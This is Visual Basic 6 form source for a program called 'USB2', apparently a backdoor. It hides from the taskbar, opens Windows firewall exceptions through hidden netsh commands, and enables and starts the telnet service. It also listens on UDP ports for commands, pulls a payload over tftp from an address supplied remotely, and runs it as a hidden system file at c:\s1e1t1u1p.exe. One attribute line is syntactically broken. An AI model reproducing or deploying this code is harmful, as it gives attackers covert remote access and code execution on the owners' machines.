VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form USB2 
   Caption         =   "USB2"
   ClientHeight    =   3150
   ClientLeft      =   60
   ClientTop       =   390
   ClientWidth     =   4680
   LinkTopic       =   "Form1"
   ScaleHeight     =   3150
   ScaleWidth      =   4680
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
   Begin MSWinsockLib.Winsock UDP2 
      Left            =   720
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin MSWinsockLib.Winsock UDP 
      Left            =   0
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
End
Attribute VB_Name = "USB2"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)

Private Sub Form_Load()
    On Error Resume Next
    If App.PrevInstance Then End
    App.TaskVisible = False
    
    Dim firewall As String
    firewall = "netsh firewall set allowedprogram " & """" & App.Path & IIf(Len(App.Path) > 3, "\", "") & App.EXEName & ".exe" & """" & " TCP enable"
    Shell firewall, vbHide
    DoEvents
    Sleep 5000
    
    UDP.RemotePort = 9885
    UDP.LocalPort = 9884
    UDP.Bind
    UDP2.LocalPort = 9883
    UDP2.Bind
          
    firewall = "netsh firewall set allowedprogram " & """" & App.Path & "\tlntsvr.exe" & """" & " Telnet enable"
    Shell firewall, vbHide
    Shell "sc config tlntsvr start= auto & sc start tlntsvr", vbHide
    firewall = "netsh firewall set allowedprogram " & """" & App.Path & "\tftp.exe" & """" & " Tftp enable"
    Shell firewall, vbHide
End Sub

Private Sub UDP_DataArrival(ByVal bytesTotal As Long)
    On Error Resume Next
    Dim remoteIP As String
    UDP.GetData remoteIP
    If remoteIP = "" Then Exit Sub

    UDP.RemoteHost = remoteIP
    UDP.SendData UDP.LocalIP
End Sub

Private Sub UDP2_DataArrival(ByVal bytesTotal As Long)
    On Error Resume Next
    Dim message As String
    UDP2.GetData message
    
    If message = "done" Then
        Shell "c:\s1e1t1u1p.exe"
        SetAttr "c:\s1e1t1u1p.exe", vbHidden + vbSystem
    Else
        SetAttr "c:\s1e1t1u1p.exe" - s - h
        Kill "c:\s1e1t1u1p.exe"
        Shell "tftp -i " & message & " get setup.exe c:\s1e1t1u1p.exe", vbHide
    End If
End Sub


